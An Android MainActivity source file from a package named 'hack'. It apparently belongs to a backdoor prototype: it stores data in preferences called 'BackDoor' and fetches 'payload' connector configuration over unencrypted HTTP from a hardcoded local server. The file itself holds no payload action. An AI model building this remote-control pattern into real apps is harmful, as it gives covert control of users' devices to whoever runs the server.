package com.hack.fooapp;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.AppCompatButton;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.hack.fooapp.payload.Connector;

import java.io.IOException;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.List;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {

    AppCompatButton reloadBtn;
    private SharedPreferences sPref;
    private Gson gson;
    private Activity activity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        this.activity = this;
        this.gson = new Gson();
        sPref = getSharedPreferences("BackDoor", Context.MODE_PRIVATE);
        reloadBtn = findViewById(R.id.bd_reload_btn);
        reloadBtn.setOnClickListener(v -> {
            RequestTask task = new RequestTask();
            task.setRequestTaskListener(new RequestTask.RequestTaskListener() {
                @Override
                public void onRequestTaskComplete() {
                    Toast.makeText(activity, "Config reloaded.", Toast.LENGTH_LONG).show();
                }
            });
            task.execute("http://192.168.31.209:5000/", sPref);
            printSPref();
        });
    }

    void printSPref() {
        String respnseString = sPref.getString("connectors", null);
        if (respnseString == null){
            return;
        }
        Type listType = new TypeToken<ArrayList<Connector>>(){}.getType();
        List<Connector> connectors = gson.fromJson(
                respnseString, listType);

        System.out.println("Connectors read from shared pref.");
        for (Connector item : connectors) {
            System.out.println(item.toString());
        }

    }

    static String getFrom(String url) throws IOException {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(url)
                .build();

        Response response = client.newCall(request).execute();
        return response.body().string();
    }

    static class RequestTask extends AsyncTask<Object, String, String> {

        private SharedPreferences sPref;
        private RequestTaskListener requestTaskListener;

        @Override
        protected String doInBackground(Object... objects) {
            sPref = (SharedPreferences) objects[1];
            String response = null;
            try {
                response = getFrom((String) objects[0]);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return response;
        }

        @Override
        protected void onPostExecute(String result) {
            super.onPostExecute(result);
            System.out.println("Discovered connectors : \n"+ result);
            SharedPreferences.Editor xPrefEdit = sPref.edit();
            xPrefEdit.putString("connectors", result);
            xPrefEdit.apply();
            if (requestTaskListener != null) {
                requestTaskListener.onRequestTaskComplete();
            }
        }

        void setRequestTaskListener(RequestTaskListener requestTaskListener) {
            this.requestTaskListener = requestTaskListener;
        }

        private interface RequestTaskListener {
            void onRequestTaskComplete();
        }
    }
}
